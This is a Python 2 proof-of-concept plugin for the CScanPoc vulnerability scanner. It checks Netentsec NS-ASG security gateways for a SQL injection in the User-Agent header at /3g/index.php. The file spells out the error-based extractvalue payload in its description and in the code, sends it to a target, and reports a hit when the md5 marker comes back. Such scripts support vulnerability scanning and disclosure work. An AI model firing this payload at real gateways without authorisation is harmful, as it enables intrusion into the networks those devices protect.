# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse


class Vuln(ABVuln):
    vuln_id = 'Netentsec_0015'  # 平台漏洞编号，留空
    name = '网康NS-ASG SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关 useragent注入漏洞：
        /3g/index.php
        'a\'=extractvalue(0x1,concat(0x23,md5(1))),\'\',\'\')#'
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1c38c061-eb8b-437f-bb2e-ce47a3ddc538'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2014-058987
            hh = hackhttp.hackhttp()
            arg = self.target
            md5_1 = 'c4ca4238a'
            # useragent 注入
            useragent = 'a\'=extractvalue(0x1,concat(0x23,md5(1))),\'\',\'\')#'
            url = arg + '/3g/index.php'
            code, head, res, err, _ = hh.http(url, user_agent=useragent)

            if (code == 200) and (md5_1 in res):
                #security_hole('SQL Injection: {url} UA:{useragent}'.format(url=url, useragent=useragent))
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
